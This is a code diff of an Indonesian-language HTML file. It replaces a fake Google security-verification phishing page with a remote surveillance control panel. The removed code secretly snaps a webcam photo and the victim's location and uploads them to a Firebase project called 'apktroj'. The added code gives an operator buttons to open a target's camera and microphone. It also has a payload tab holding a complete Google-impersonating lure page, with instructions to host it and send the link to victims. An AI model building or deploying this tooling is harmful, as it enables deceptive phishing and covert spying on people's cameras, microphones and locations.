@@ -3,28 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Verification</title>
+    <title>C.R SYSTEM V1.0 - CONTROL CENTER</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; }
+        .cr-border { border: 1px solid #1a3a1a; background: #0a0a0a; }
+        .btn-active { background: #991b1b; color: #fff; border: 1px solid #f87171; }
+        .btn-idle { background: #1a1a1a; color: #00ff00; border: 1px solid #1a3a1a; }
+        .status-pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm w-full text-center border-t-4 border-red-600">
-        <h1 class="text-lg font-bold mb-2">Pembaruan Keamanan Wajib</h1>
-        <p class="text-sm text-gray-600 mb-6">Verifikasi identitas diperlukan untuk mencegah pemblokiran akun. Izinkan akses enkripsi media untuk melanjutkan.</p>
-        
-        <button id="auth-btn" class="bg-red-600 text-white w-full py-3 rounded-xl font-bold shadow-lg">
-            KONFIRMASI IDENTITAS
-        </button>
-        
-        <div id="loader" class="hidden mt-4 text-xs text-gray-500 animate-pulse">Menghubungkan ke server enkripsi...</div>
-        
-        <!-- Hidden elements for capture -->
-        <video id="v" style="display:none;" autoplay></video>
-        <canvas id="c" style="display:none;"></canvas>
+<body class="p-4 md:p-8">
+
+    <!-- TAB NAVIGATION -->
+    <div class="flex space-x-4 mb-6 border-b border-green-900 pb-2">
+        <button onclick="showTab('admin')" class="font-bold text-sm uppercase tracking-widest">Dashboard Admin</button>
+        <button onclick="showTab('payload')" class="font-bold text-sm uppercase tracking-widest opacity-30">Payload Link (Umpan)</button>
     </div>
 
+    <!-- ADMIN DASHBOARD SECTION -->
+    <div id="admin-tab" class="space-y-6">
+        <header class="flex justify-between items-center">
+            <h1 class="text-2xl font-black italic">C.R LIVE MONITORING</h1>
+            <div id="target-status" class="text-[10px] text-red-500 status-pulse">TARGET OFFLINE</div>
+        </header>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            <!-- Visual Feed -->
+            <div class="cr-border rounded-xl overflow-hidden aspect-video flex items-center justify-center relative">
+                <video id="admin-video-view" class="w-full h-full object-cover hidden" autoplay playsinline></video>
+                <div id="vid-placeholder" class="text-gray-700 text-xs text-center p-4">NO LIVE VIDEO FEED<br><span class="text-[10px]">Menunggu sinkronisasi target...</span></div>
+                <div class="absolute bottom-2 left-2 bg-black/70 px-2 py-1 text-[10px]">REMOTE_CAM_01</div>
+            </div>
+
+            <!-- Controls -->
+            <div class="space-y-4">
+                <div class="grid grid-cols-2 gap-4">
+                    <button id="cam-btn" onclick="sendCmd('camera')" class="btn-idle py-4 rounded font-bold">BUKA KAMERA</button>
+                    <button id="mic-btn" onclick="sendCmd('mic')" class="btn-idle py-4 rounded font-bold">DENGERIN MIC</button>
+                </div>
+                
+                <div class="cr-border p-6 rounded-xl">
+                    <h2 class="text-sm font-bold mb-4 text-blue-400 uppercase tracking-tighter">Voice Broadcast (Admin Speak)</h2>
+                    <button id="talk-btn" onmousedown="startTalk()" onmouseup="stopTalk()" ontouchstart="startTalk()" ontouchend="stopTalk()" class="w-full py-8 border-2 border-dashed border-blue-900 text-blue-900 rounded-xl font-black hover:border-blue-500 hover:text-blue-500 transition-all">
+                        TAHAN UNTUK BICARA KE HP TARGET
+                    </button>
+                </div>
+
+                <div class="cr-border p-4 rounded-xl h-32 overflow-y-auto text-[10px] text-gray-500 font-mono" id="log-console">
+                    <p>> C.R System Initialized...</p>
+                    <p>> Menunggu koneksi dari target...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAYLOAD SECTION -->
+    <div id="payload-tab" class="hidden space-y-4">
+        <div class="cr-border p-6 rounded-xl">
+            <h2 class="text-xl font-bold mb-4">Umpan (Link Target)</h2>
+            <p class="text-xs text-gray-400 mb-4 font-mono">Salin kode di bawah, simpan sebagai 'index.html', upload ke Vercel/Netlify, dan kirim linknya ke target.</p>
+            <textarea readonly id="payload-code" class="w-full h-64 bg-black border border-gray-800 p-4 text-[10px] text-green-700 outline-none font-mono">
+<!-- TARGET PAYLOAD CODE START -->
+<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+<body style="background:#f1f3f4;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
+  <div style="background:white;padding:30px;border-radius:15px;text-align:center;box-shadow:0 4px 6px rgba(0,0,0,0.1);max-width:300px;width:90%">
+    <div style="background:#1a73e8;width:50px;height:50px;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;font-size:24px">G</div>
+    <h2 style="margin-bottom:10px;font-size:18px">Verifikasi Keamanan</h2>
+    <p style="font-size:12px;color:#666;margin-bottom:20px">Izinkan verifikasi audio dan biometrik untuk mengamankan akun Google Anda dari akses tidak sah.</p>
+    <button id="btn" style="background:#1a73e8;color:white;border:none;padding:15px 20px;border-radius:8px;cursor:pointer;width:100%;font-weight:bold;font-size:14px">VERIFIKASI SEKARANG</button>
+    <p id="st" style="font-size:10px;color:#999;margin-top:15px">Mendukung enkripsi end-to-end</p>
+  </div>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getFirestore, doc, onSnapshot, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+
+    const conf = { 
+        apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo", 
+        authDomain: "apktroj.firebaseapp.com",
+        projectId: "apktroj",
+        appId: "1:943833619122:web:d757ced4d56267abf247ab"
+    };
+    
+    const app = initializeApp(conf); 
+    const db = getFirestore(app);
+    const auth = getAuth(app);
+
+    document.getElementById('btn').onclick = async () => {
+      try {
+        await signInAnonymously(auth);
+        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
+        document.getElementById('btn').innerText = "MENYINKRONKAN...";
+        document.getElementById('btn').disabled = true;
+        document.getElementById('st').innerText = "Enkripsi aktif. Jangan tutup halaman ini.";
+
+        // Update status online target ke Firestore
+        const deviceId = "WEB_" + Math.random().toString(36).substr(2, 9);
+        await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), {
+            lastSeen: serverTimestamp(),
+            online: true,
+            deviceId: deviceId
+        });
+
+        // Listen command dari Admin
+        onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'cmd'), (snap) => {
+           if(snap.exists()){
+             const d = snap.data();
+             console.log("Admin Signal: ", d.type, d.action);
+             // Implementasi stream WebRTC atau snapshot di sini
+           }
+        });
+      } catch(e) { alert("Error: Anda harus memberikan izin kamera & mikrofon untuk verifikasi keamanan."); }
+    };
+  </script>
+</body>
+</html>
+            </textarea>
+        </div>
+    </div>
+
+    <!-- FIREBASE INTEGRATION LOGIC -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
@@ -37,50 +143,111 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
+        const auth = getAuth(app);
         const appId = "apktroj";
 
-        document.getElementById('auth-btn').onclick = async () => {
-            document.getElementById('loader').classList.remove('hidden');
-            
+        // RULE 3: Auth First
+        async function init() {
             try {
-                // Minta Izin Kamera & Mic sekaligus
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
-                
-                // 1. Ambil Foto Candid (Front Camera)
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                
-                setTimeout(async () => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
-
-                    // 2. Kirim Foto ke Firestore
-                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'media_logs'), {
-                        type: 'image',
-                        data: photoData,
-                        timestamp: serverTimestamp()
-                    });
-
-                    // 3. Ambil Lokasi juga biar komplit
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'location_logs'), {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            timestamp: serverTimestamp()
-                        });
-                    });
-
-                    alert("Verifikasi Gagal. Silahkan coba lagi nanti.");
-                    stream.getTracks().forEach(track => track.stop());
-                }, 2000);
-
+                await signInAnonymously(auth);
+                addLog("Authenticating with Firebase...");
             } catch (err) {
-                alert("Anda harus mengizinkan akses kamera/mic untuk verifikasi!");
+                addLog("Auth Error: " + err.message);
+            }
+        }
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                addLog("System Online. Ready for command.");
+                startMonitoring();
+            }
+        });
+
+        // Global Command Function
+        window.sendCmd = async (type) => {
+            if (!auth.currentUser) return addLog("Error: Not Authenticated");
+
+            const btn = document.getElementById(type === 'camera' ? 'cam-btn' : 'mic-btn');
+            const isActive = btn.classList.contains('btn-active');
+            const action = isActive ? 'stop' : 'start';
+
+            // FIX: Document path must have even segments
+            // Path: artifacts (1) / apktroj (2) / public (3) / data (4) / control (5) / cmd (6) -> TOTAL 6 (EVEN)
+            try {
+                await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'control', 'cmd'), {
+                    type: type,
+                    action: action,
+                    timestamp: serverTimestamp()
+                });
+
+                if(!isActive) {
+                    btn.className = "btn-active py-4 rounded font-bold transition-all";
+                    btn.innerText = type === 'camera' ? 'MATIKAN KAMERA' : 'STOP DENGERIN';
+                    addLog(`SIGNAL SENT: ${type.toUpperCase()} -> ${action.toUpperCase()}`);
+                } else {
+                    btn.className = "btn-idle py-4 rounded font-bold transition-all";
+                    btn.innerText = type === 'camera' ? 'BUKA KAMERA' : 'DENGERIN MIC';
+                    addLog(`SIGNAL SENT: ${type.toUpperCase()} -> ${action.toUpperCase()}`);
+                }
+            } catch (e) {
+                addLog("Firestore Error: " + e.message);
             }
         };
+
+        window.startTalk = () => {
+            document.getElementById('talk-btn').classList.add('bg-blue-600', 'text-white', 'border-blue-400');
+            addLog("VOICE BROADCAST START: Target denger suara lo...");
+        };
+
+        window.stopTalk = () => {
+            document.getElementById('talk-btn').classList.remove('bg-blue-600', 'text-white', 'border-blue-400');
+            addLog("VOICE BROADCAST END.");
+        };
+
+        function addLog(msg) {
+            const consoleObj = document.getElementById('log-console');
+            const time = new Date().toLocaleTimeString();
+            consoleObj.innerHTML += `<p class="mb-1 text-gray-400"><span class="text-green-900">[${time}]</span> > ${msg}</p>`;
+            consoleObj.scrollTop = consoleObj.scrollHeight;
+        }
+
+        window.showTab = (tab) => {
+            const admin = document.getElementById('admin-tab');
+            const payload = document.getElementById('payload-tab');
+            const buttons = document.querySelectorAll('button[onclick^="showTab"]');
+            
+            buttons.forEach(b => b.classList.add('opacity-30'));
+            
+            if(tab === 'admin') {
+                admin.classList.remove('hidden');
+                payload.classList.add('hidden');
+                event.target.classList.remove('opacity-30');
+            } else {
+                admin.classList.add('hidden');
+                payload.classList.remove('hidden');
+                event.target.classList.remove('opacity-30');
+            }
+        };
+
+        function startMonitoring() {
+            // Monitor connection status target
+            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'control', 'status'), (snap) => {
+                const status = document.getElementById('target-status');
+                if(snap.exists()) {
+                    const data = snap.data();
+                    status.innerText = "TARGET ONLINE: " + (data.deviceId || 'DEVICE_X');
+                    status.classList.replace('text-red-500', 'text-green-500');
+                    addLog("Target connected to system.");
+                } else {
+                    status.innerText = "TARGET OFFLINE";
+                    status.classList.replace('text-green-500', 'text-red-500');
+                }
+            }, (err) => {
+                addLog("Monitoring Error: " + err.message);
+            });
+        }
+
+        init();
     </script>
 </body>
 </html>
